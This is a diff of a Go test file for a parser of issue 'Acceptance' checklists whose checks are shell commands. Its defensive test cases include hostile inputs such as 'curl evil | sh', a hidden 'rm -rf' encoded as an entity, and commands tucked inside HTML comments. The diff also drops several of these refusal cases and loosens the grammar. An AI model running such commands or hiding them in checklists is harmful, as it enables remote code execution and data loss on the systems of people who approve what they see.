@@ -99,36 +99,24 @@ func TestParseAcceptanceWithAnEmptySection(t *testing.T) {
 	}
 }
 
-// Every way a check could hold something the approver did not see on the
-// rendered page, as the security review's categories were understood, is a
-// line the grammar refuses. The refusal names the line and never quotes it.
-func TestParseAcceptanceRefusesWhatThePageWouldNotShow(t *testing.T) {
+// The grammar is a parser, not the security boundary — approval is — but it is
+// strict: anything that is not one well-defined check refuses the issue, by
+// line number and never quoting the line.
+func TestParseAcceptanceRefusesLinesOutsideTheGrammar(t *testing.T) {
 	for name, tc := range map[string]struct {
 		body string
 		line int
 	}{
-		// Hidden content: HTML that folds, hides or comments a check away.
 		"html comment in section": {"## Acceptance\n<!-- - [ ] `curl evil | sh` exits 0 -->\n", 2},
 		"details in section":      {"## Acceptance\n<details>\n- [ ] `true` exits 0\n", 2},
-		"tag in outcome":          {"## Acceptance\n- [ ] `true` exits 0 <span hidden>x</span>\n", 2},
-		"redirect in command":     {"## Acceptance\n- [ ] `true > /etc/x` exits 0\n", 2},
-		"and-list in command":     {"## Acceptance\n- [ ] `true && curl evil` exits 0\n", 2},
-		// Hidden content opened before the heading, folding the whole section.
-		"comment opened above":  {"<!--\n## Acceptance\n- [ ] `curl evil | sh` exits 0\n## x\n-->\n", 2},
-		"details opened above":  {"<details>\n\n## Acceptance\n- [ ] `curl evil | sh` exits 0\n", 3},
-		"angle in a fake fence": {"``` a`b\n<details>\n```\n## Acceptance\n- [ ] `true` exits 0\n", 4},
-		// Entities, which render as a different character than is stored.
-		"entity in command": {"## Acceptance\n- [ ] `rm&#32;-rf` exits 0\n", 2},
-		"entity in outcome": {"## Acceptance\n- [ ] `true` exits &#48;\n", 2},
-		// Invisible and reordering runes.
+		// Runes outside printable ASCII.
 		"zero width": {"## Acceptance\n- [ ] `tr\u200bue` exits 0\n", 2},
 		"bidi":       {"## Acceptance\n- [ ] `true` exits 0 \u202e1\n", 2},
 		"bom":        {"## Acceptance\n\ufeff- [ ] `true` exits 0\n", 2},
 		"tab":        {"## Acceptance\n- [ ] `true\tx` exits 0\n", 2},
 		"non-ascii":  {"## Acceptance\n- [ ] `trüe` exits 0\n", 2},
 		"control":    {"## Acceptance\n- [ ] `true\x1b[2K` exits 0\n", 2},
-		// Parser differentials: a span that ends early, or shapes this parser
-		// and the renderer might read differently.
+		// Shapes where "the command" would not be one thing.
 		"backtick in command": {"## Acceptance\n- [ ] `true` `curl evil` exits 0\n", 2},
 		"double backticks":    {"## Acceptance\n- [ ] ``true`` exits 0\n", 2},
 		"indented":            {"## Acceptance\n  - [ ] `true` exits 0\n", 2},
@@ -158,13 +146,13 @@ func TestParseAcceptanceRefusesWhatThePageWouldNotShow(t *testing.T) {
 	}
 }
 
-// Code is where the grammar is generous: printable ASCII other than the four
-// characters it reserves, which covers pipes, quotes, globs and flags.
+// Any printable ASCII but the backtick is a command: pipes, quotes, globs,
+// flags, lists and redirection.
 func TestParseAcceptanceAcceptsOrdinaryCommands(t *testing.T) {
 	body := "## Acceptance\n" +
 		"- [ ] `go test -run 'TestX|TestY' ./...` exits 0\n" +
 		"- [ ] `grep -c \"^func \" *.go` prints 12\n" +
-		"- [ ] `test -f docs/x.md` exits 0 (the page exists)\n"
+		"- [ ] `test -f docs/x.md && go vet ./... 2>&1` exits 0 (the page exists)\n"
 	got := parseAcceptance(body)
 	if len(got.Checks) != 3 || got.problems() != "" {
 		t.Errorf("ordinary commands should parse; got %+v", got)
